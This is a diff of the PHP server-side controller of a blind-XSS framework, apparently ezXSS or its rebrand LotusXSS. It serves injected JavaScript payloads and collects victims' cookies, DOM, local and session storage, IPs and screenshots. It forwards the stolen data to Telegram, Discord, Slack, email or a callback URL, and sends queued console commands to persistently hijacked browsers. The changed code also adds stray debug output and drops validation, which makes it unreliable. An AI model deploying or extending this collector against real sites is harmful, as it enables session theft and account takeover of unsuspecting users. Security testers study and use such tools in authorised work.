@@ -15,16 +15,11 @@ class Payloads extends Controller
     public function __construct()
     {
         parent::__construct();
-
+        
         // Add CORS headers
         header('Access-Control-Allow-Origin: *');
         header('Access-Control-Allow-Headers: origin, x-requested-with, content-type');
         header('Access-Control-Allow-Methods: GET, POST');
-
-        // Cache headers
-        header('Cache-Control: no-cache, no-store, must-revalidate');
-        header('Pragma: no-cache');
-        header('Expires: 0');
     }
 
     /**
@@ -56,17 +51,17 @@ class Payloads extends Controller
         $screenshot = $payload['collect_screenshot'] ? $this->view->getPayload('screenshot') : '';
 
         // Create the persistent payload
-        if ($payload['persistent']) {
+        if($payload['persistent']) {
             $persistent = $this->view->getPayload('persist');
         }
 
-        $this->view->renderData('payload', url);
         $this->view->renderData('noCollect', implode(',', $noCollect), true);
         $this->view->renderData('pages', implode(',', $pages), true);
-        $this->view->renderDataWithLines('customjs', $payload['customjs'], true);
-        $this->view->renderDataWithLines('globaljs', $this->model('Setting')->get('customjs'), true);
-        $this->view->renderDataWithLines('screenshot', $screenshot, true);
-        $this->view->renderDataWithLines('persistent', $persistent ?? '', true);
+        $this->view->renderData('customjs', $payload['customjs'], true);
+        $this->view->renderData('globaljs', $this->model('Setting')->get('customjs'), true);
+        $this->view->renderData('screenshot', $screenshot, true);
+        $this->view->renderData('payload', url);
+        $this->view->renderData('persistent', $persistent ?? '', true);
 
         return $this->view->getContent();
     }
@@ -101,18 +96,14 @@ class Payloads extends Controller
 
         // Check method
         if (!$this->isPOST()) {
-            return 'github.com/w4rphx/LotusXSS';
+            return 'github.com/ssl/ezXSS';
         }
 
-        // Decode the JSON or form data
+        // Decode the JSON data
         $data = json_decode(file_get_contents('php://input'), false);
 
-        if (empty($data) || !is_object($data)) {
-            $data = (object)$_POST;
-            
-            if (empty($data) || !is_object($data)) {
-                return 'github.com/w4rphxssl/LotusXSS';
-            }
+        if(empty($data) || !is_object($data)) {
+            return 'github.com/ssl/ezXSS';
         }
 
         // Set a default value for the screenshot
@@ -123,18 +114,13 @@ class Payloads extends Controller
 
         // Remove the protocol from the origin URL
         $data->origin = str_replace(['https://', 'http://'], '', $data->origin ?? '');
-        $data->origin = ($data->origin === '' && $data->uri !== '') ? (parse_url($data->uri ?? '')['host'] ?? '') : $data->origin;
 
         // Truncate very long strings
         $data->uri = substr($data->uri ?? '', 0, 1000);
         $data->referer = substr($data->referer ?? '', 0, 1000);
-        $data->origin = substr($data->origin ?? '', 0, 255);
-        $data->payload = substr($data->payload ?? '', 0, 255);
+        $data->origin = substr($data->origin ?? '', 0, 500);
+        $data->payload = substr($data->payload ?? '', 0, 500);
         $data->{'user-agent'} = substr($data->{'user-agent'} ?? '', 0, 500);
-
-        if(empty($data->payload)) {
-            return 'github.com/w4rphx/LotusXSS';
-        }
 
         // Check black and whitelist
         $payload = $this->getPayloadByUrl($data->payload);
@@ -144,13 +130,13 @@ class Payloads extends Controller
 
         // Check for blacklisted domains
         foreach ($blacklistDomains as $blockedDomain) {
-            if ($data->origin !== '' && $data->origin == $blockedDomain) {
-                return 'github.com/w4rphx/ezXSS';
+            if ($data->origin == $blockedDomain) {
+                return 'github.com/ssl/ezXSS';
             }
             if (strpos($blockedDomain, '*') !== false) {
                 $blockedDomain = str_replace('*', '(.*)', $blockedDomain);
                 if (preg_match('/^' . $blockedDomain . '$/', $data->origin)) {
-                    return 'github.com/w4rphx/LotusXSS';
+                    return 'github.com/ssl/ezXSS';
                 }
             }
         }
@@ -159,7 +145,7 @@ class Payloads extends Controller
         if ($payload['whitelist'] !== '' && $payload['whitelist'] !== null) {
             $foundWhitelist = false;
             foreach ($whitelistDomains as $whitelistDomain) {
-                if ($data->origin !== '' && $data->origin == $whitelistDomain) {
+                if ($data->origin == $whitelistDomain) {
                     $foundWhitelist = true;
                 }
                 if (strpos($whitelistDomain, '*') !== false) {
@@ -170,61 +156,56 @@ class Payloads extends Controller
                 }
             }
             if (!$foundWhitelist) {
-                return 'github.com/w4rphx/LotusXSS';
+                return 'github.com/ssl/ezXSS';
             }
         }
 
         // Check if callback should be threated as persistent mode
-        if (isset($data->method) && $data->method === 'persist') {
+        if(isset($data->method) && $data->method === 'persist') {
             return $this->persistCallback($data);
         }
 
         // Check if the report should be saved or alerted
         $doubleReport = false;
         if ($this->model('Setting')->get('filter-save') == 0 || $this->model('Setting')->get('filter-alert') == 0) {
-            $searchId = $this->model('Report')->searchForDublicates($data->cookies ?? '', $data->origin, $data->referer, $data->uri, $data->{'user-agent'}, $data->dom ?? '', $data->ip);
+            $searchId = $this->model('Report')->searchForDublicates($data->cookies ?? '', $data->dom ?? '', $data->origin, $data->referer, $data->uri, $data->{'user-agent'}, $data->ip);
+            echo 'searchid: ' . $searchId;
             if ($searchId !== false) {
                 if ($this->model('Setting')->get('filter-save') == 0 && $this->model('Setting')->get('filter-alert') == 0) {
-                    return 'github.com/w4rphx/LotusXSS';
+                    echo 'no: ';
+                    return 'github.com/ssl/ezXSS';
                 } else {
+                    echo 'yes: ' . $searchId;
                     $doubleReport = $searchId;
                 }
             }
         }
 
         if (($doubleReport !== false && ($this->model('Setting')->get('filter-save') == 1 || $this->model('Setting')->get('filter-alert') == 1)) || $doubleReport === false) {
+
             // Create an image from the screenshot data
             if (!empty($data->screenshot)) {
                 try {
-                    $screenshot = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $data->screenshot), true);
-                    if(!$screenshot) {
-                        throw new Exception('Invalid screenshot data posted to callback');
+                    $screenshot = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $data->screenshot));
+                    $data->screenshotName = time() . md5(
+                        $data->uri . time() . bin2hex(openssl_random_pseudo_bytes(16))
+                    ) . bin2hex(openssl_random_pseudo_bytes(5));
+                    $saveImage = fopen(__DIR__ . "/../../assets/img/report-{$data->screenshotName}.png", 'w');
+                    if(!$saveImage) {
+                        throw new Exception('Unable to save screenshots to server, check permissions');
                     }
-                    $data->screenshotBase = base64_encode($screenshot);
-                    if($this->model('Setting')->get('storescreenshot') == 0) {
-                        // Store screenshot as file on server
-                        $data->screenshotData = time() . md5(
-                            $data->uri . time() . bin2hex(openssl_random_pseudo_bytes(16))
-                        ) . bin2hex(openssl_random_pseudo_bytes(5));
-                        $saveImage = fopen(__DIR__ . "/../../assets/img/report-{$data->screenshotData}.png", 'w');
-                        if(!$saveImage) {
-                            throw new Exception('Unable to save screenshots to server, check permissions');
-                        }
-                        fwrite($saveImage, $screenshot);
-                        fclose($saveImage);
-                    } else {
-                        // Store screenshot as base64 in database
-                        $data->screenshotData = $data->screenshotBase;
-                    }
+                    fwrite($saveImage, $screenshot);
+                    fclose($saveImage);
                 } catch (Exception $e) {
                     $this->log($e->getMessage());
-                    $data->screenshotData = '';
+                    $data->screenshotName = '';
                 }
             }
 
             // Save the report
             if (($doubleReport !== false && $this->model('Setting')->get('filter-save') == 1) || $doubleReport === false) {
-                $shareId = sha1(bin2hex(openssl_random_pseudo_bytes(32)) . time()) . substr(md5(time()), 4, 10);
+                echo 'yes: ' . $doubleReport;
+                $shareId = sha1(bin2hex(openssl_random_pseudo_bytes(32)) . time());
                 $data->id = $this->model('Report')->add(
                     $shareId,
                     $data->cookies ?? '',
@@ -234,38 +215,42 @@ class Payloads extends Controller
                     $data->uri,
                     $data->{'user-agent'},
                     $data->ip,
-                    $data->screenshotData ?? '',
+                    ($data->screenshotName ?? ''),
                     json_encode($data->localstorage ?? ''),
                     json_encode($data->sessionstorage ?? ''),
                     $data->payload
                 );
                 $data->domain = host;
             } else {
-                if ($doubleReport !== false && $this->model('Setting')->get('filter-alert') == 1) {
+                echo 'else';
+                if($doubleReport !== false && $this->model('Setting')->get('filter-alert') == 1) {
+                    echo 'ELSEYES';
+                    var_dump($data);
                     $data = (object) $this->model('Report')->getById($doubleReport);
+                    var_dump($data);
                 }
             }
             $data->time = time();
-            $data->timestamp = date('c', strtotime('now'));
+            $data->timestamp = date("c", strtotime("now"));
 
             // Send out alerts
             if (($doubleReport !== false && $this->model('Setting')->get('filter-alert') == 1) || $doubleReport === false) {
+                echo 'alert!';
                 try {
                     $this->alert($data);
                 } catch (Exception $e) {
-                    $this->log($e->getMessage());
                 }
             }
         }
 
-        return 'github.com/w4rphx/LotusXSS';
+        return 'github.com/ssl/ezXSS';
     }
 
     /**
      * Persistent callback function that receives all incoming data from persistent mode
      *
      * @param object $data The data coming from the callback function
-     * @return string
+     * @return void
      */
     private function persistCallback($data)
     {
@@ -273,25 +258,25 @@ class Payloads extends Controller
         $tryInit = false;
 
         // A new request has been made
-        if ($data->type === 'init') {
+        if($data->type === 'init') {
             $tryInit = true;
         }
 
         // Session is pinged and is waiting for pong
-        if ($data->type === 'ping') {
+        if($data->type === 'ping') {
             try {
                 $session = $this->model('Session')->getByClientId($data->clientid ?? '', $data->origin);
 
                 $this->model('Session')->setSingleValue($session['id'], 'time', time());
-                $this->model('Session')->setSingleDataValue($session['id'], 'console', $data->console ?? '');
+                $this->model('Session')->setSingleValue($session['id'], 'console', $data->console ?? '');
 
                 return $this->model('Console')->getNext($data->clientid ?? '', $data->origin);
-            } catch (Exception $e) {
+            } catch(Exception $e) {
                 $tryInit = true;
             }
         }
 
-        if ($tryInit) {
+        if($tryInit) {
             // Save the request data
             $data->id = $this->model('Session')->add(
                 $data->clientid ?? '',
@@ -322,13 +307,13 @@ class Payloads extends Controller
     {
         // Callback alerting
         if ($this->model('Setting')->get('alert-callback') == 1) {
-            $this->callbackAlert();
+            $this->callbackAlert($data);
         }
 
         // Check if the DOM should be truncated
         if ($this->model('Setting')->get('dompart') > 0 && strlen($data->dom ?? '') > $this->model('Setting')->get('dompart')) {
             $data->dom = substr($data->dom ?? '', 0, $this->model('Setting')->get('dompart')) .
-                "\r\nView the full DOM on the report page";
+                '&#13;&#10;&#13;&#10;View full dom on the report page or change this setting on /settings';
         }
 
         $payload = $this->getPayloadByUrl($data->payload);
@@ -340,7 +325,7 @@ class Payloads extends Controller
 
             foreach ($alerts as $alert) {
                 if ($alert['user_id'] === 0) {
-                    // Global alerting that always sends if enabled
+                    // Global alerting that allways sends if enabled
                     $this->mailAlert($data, $alert['value1']);
                 } elseif ($payload['user_id'] !== 0 && $alert['user_id'] === $payload['user_id']) {
                     // Sends alert to user that owns the payload
@@ -356,7 +341,7 @@ class Payloads extends Controller
 
             foreach ($alerts as $alert) {
                 if ($alert['user_id'] === 0) {
-                    // Global alerting that always sends if enabled
+                    // Global alerting that allways sends if enabled
                     $this->telegramAlert($data, $alert['value1'], $alert['value2']);
                 } elseif ($payload['user_id'] !== 0 && $alert['user_id'] === $payload['user_id']) {
                     // Sends alert to user that owns the payload
@@ -372,7 +357,7 @@ class Payloads extends Controller
 
             foreach ($alerts as $alert) {
                 if ($alert['user_id'] === 0) {
-                    // Global alerting that always sends if enabled
+                    // Global alerting that allways sends if enabled
                     $this->slackAlert($data, $alert['value1']);
                 } elseif ($payload['user_id'] !== 0 && $alert['user_id'] === $payload['user_id']) {
                     // Sends alert to user that owns the payload
@@ -388,7 +373,7 @@ class Payloads extends Controller
 
             foreach ($alerts as $alert) {
                 if ($alert['user_id'] === 0) {
-                    // Global alerting that always sends if enabled
+                    // Global alerting that allways sends if enabled
                     $this->discordAlert($data, $alert['value1']);
                 } elseif ($payload['user_id'] !== 0 && $alert['user_id'] === $payload['user_id']) {
                     // Sends alert to user that owns the payload
@@ -401,9 +386,10 @@ class Payloads extends Controller
     /**
      * Sends out alert to custom callback url
      * 
+     * @param object $data The data to be displayed in the alert message
      * @return void
      */
-    private function callbackAlert()
+    private function callbackAlert($data)
     {
         // Send alert to custom callback url
         $url = (parse_url($this->model('Setting')->get('callback-url'), PHP_URL_SCHEME) ? '' : 'https://') . $this->model('Setting')->get('callback-url');
@@ -413,8 +399,8 @@ class Payloads extends Controller
         curl_setopt($ch, CURLOPT_TIMEOUT, 20);
         curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
         curl_setopt($ch, CURLOPT_POSTFIELDS, file_get_contents('php://input'));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_exec($ch);
     }
 
@@ -428,32 +414,21 @@ class Payloads extends Controller
      */
     private function telegramAlert($data, $bottoken, $chatid)
     {
+        if (!empty($data->screenshot)) {
+            $data->screenshot = "https://{$data->domain}/assets/img/report-{$data->screenshotName}.png";
+        }
+
         // Create Telegram alert template
         $alertTemplate = $this->view->getAlert('telegram.md');
         $alertTemplate = $this->view->renderAlertData($alertTemplate, $data);
 
         // Send alert to telegram bot API
         $ch = curl_init("https://api.telegram.org/bot{$bottoken}/sendMessage");
-        curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);
         curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
-        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['chat_id' => $chatid, 'parse_mode' => 'markdown', 'text' => $alertTemplate]));
+        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['chat_id' => $chatid, 'parse_mode' => 'markdown', 'disable_web_page_preview' => false, 'text' => $alertTemplate]));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_exec($ch);
-
-        // Send photo with screenshot
-        if (!empty($data->screenshotBase)) {
-            $screenshotFile = 'data://application/octet-stream;base64,' . $data->screenshotBase;
-            $curlFile = new \CURLFile($screenshotFile, 'image/png', 'screenshot.png');
-
-            $ch = curl_init("https://api.telegram.org/bot{$bottoken}/sendPhoto");
-            curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);
-            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-type: multipart/form-data']);
-            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
-            curl_setopt($ch, CURLOPT_POSTFIELDS, ['chat_id' => $chatid, 'photo' => $curlFile, 'caption' => "Screenshot from XSS Report #{$data->id}"]);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_exec($ch);
-        }
     }
 
     /**
@@ -466,53 +441,29 @@ class Payloads extends Controller
     private function mailAlert($data, $email)
     {
         // Escapes data for alert
-        $escapedData = json_decode(json_encode($data), false) ?? json_decode('{}', false);
-        array_walk_recursive($escapedData, function (&$item) {
-            if (is_string($item)) {
+        $escapedData = json_decode(json_encode($data), false);
+        array_walk_recursive($escapedData, function(&$item) {
+            if(is_string($item)) {
                 $item = e($item);
             }
         });
 
-        if (!empty($data->screenshotBase)) {
-            $attachment = chunk_split($escapedData->screenshotBase);
-            $escapedData->screenshot = '<img style="max-width:100%;" src="cid:ezXSS">';
-        } else {
-            $escapedData->screenshot = '';
+        if (!empty($data->screenshot)) {
+            $escapedData->screenshot = "<img style=\"max-width:100%;\" src=\"https://{$data->domain}/assets/img/report-{$data->screenshotName}.png\">";
         }
 
         // Create mail alert template
         $alertTemplate = $this->view->getAlert('mail.html');
         $alertTemplate = $this->view->renderAlertData($alertTemplate, $escapedData);
 
-        // Headers
-        $boundary = md5(uniqid(time(), true));
+        $headers[] = 'From: ezXSS';
         $headers[] = 'MIME-Version: 1.0';
-        $headers[] = 'From: LotusXSS';
-        $headers[] = "Content-Type: multipart/mixed; boundary=\"ez$boundary\"";
-
-        // Multipart to include alert template
-        $multipart[] = "--ez$boundary";
-        $multipart[] = 'Content-Type: text/html; charset=utf-8';
-        $multipart[] = 'Content-Transfer-Encoding: Quot-Printed';
-        $multipart[] = "\n$alertTemplate\n";
-
-        // Multipart to include screenshot
-        if (!empty($data->screenshotBase)) {
-            $multipart[] = "--ez$boundary";
-            $multipart[] = 'Content-Type: image/png; file_name="screenshot.png"';
-            $multipart[] = 'Content-ID: <LotusXSS>';
-            $multipart[] = 'Content-Transfer-Encoding: base64';
-            $multipart[] = 'Content-Disposition: inline; filename="screenshot.png"';
-            $multipart[] = "\n$attachment\n";
-        }
-        $multipart[] = "--ez$boundary--";
-
-        // Send the mail
+        $headers[] = 'Content-type: text/html; charset=iso-8859-1';
         mail(
             $email,
-            '[LotusXSS] XSS on ' . $escapedData->uri ?? '',
-            implode("\n", str_replace(chr(0), '', $multipart)),
-            implode("\n", $headers)
+            '[ezXSS] XSS on ' . $data->uri,
+            $alertTemplate,
+            implode("\r\n", $headers)
         );
     }
 
@@ -535,8 +486,8 @@ class Payloads extends Controller
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
         curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
         curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['type' => 'mrkdwn', 'text' => $alertTemplate]));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_exec($ch);
     }
 
@@ -550,20 +501,15 @@ class Payloads extends Controller
     private function discordAlert($data, $webhookURL)
     {
         // Escapes data for alert
-        $escapedData = json_decode(json_encode($data), false) ?? [];
-        array_walk_recursive($escapedData, function (&$item) {
-            if (is_string($item)) {
+        $escapedData = json_decode(json_encode($data), false);
+        array_walk_recursive($escapedData, function(&$item) {
+            if(is_string($item)) {
                 $item = addslashes($item);
             }
         });
 
-        // Check if a screenshot is provided
-        if (!empty($data->screenshotBase)) {
-            $screenshotFile = 'data://application/octet-stream;base64,' . $escapedData->screenshotBase;
-            $curlFile = new \CURLFile($screenshotFile, 'image/png', 'screenshot.png');
-            $escapedData->screenshot = 'attachment://screenshot.png';
-        } else {
-            $escapedData->screenshot = '';
+        if (!empty($data->screenshot)) {
+            $escapedData->screenshot = "https://{$data->domain}/assets/img/report-{$data->screenshotName}.png";
         }
 
         // Create Discord alert template
@@ -573,13 +519,13 @@ class Payloads extends Controller
 
         // Send alert to Discord webhook
         $ch = curl_init($webhookURL);
-        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-type: multipart/form-data']);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
         curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
         curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, !empty($curlFile) ? ['payload_json' => $discordMessage, 'file' => $curlFile] : ['payload_json' => $discordMessage]);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $discordMessage);
         curl_setopt($ch, CURLOPT_HEADER, false);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_exec($ch);
     }
 
@@ -596,12 +542,12 @@ class Payloads extends Controller
 
         try {
             // Attempt to retrieve the payload by the full path
-            $url = (array_key_exists(2, $splitUrl) ? $splitUrl[2] : '') . '/' . (array_key_exists(3, $splitUrl) ? $splitUrl[3] : '');
+            $url = (array_key_exists(2, $splitUrl) ? $splitUrl[2] : '' ). '/' . (array_key_exists(3, $splitUrl) ? $splitUrl[3] : '');
             $payload = $this->model('Payload')->getByPayload($url);
         } catch (Exception $e) {
             try {
                 // If the payload is not found by the full path, try to retrieve it by the domain name
-                $payload = $this->model('Payload')->getByPayload((array_key_exists(2, $splitUrl) ? $splitUrl[2] : ''));
+                $payload = $this->model('Payload')->getByPayload((array_key_exists(2, $splitUrl) ? $splitUrl[2] : '' ));
             } catch (Exception $e) {
                 // If the payload is still not found, fallback to the default payload
                 $payload = $this->model('Payload')->getById(1);
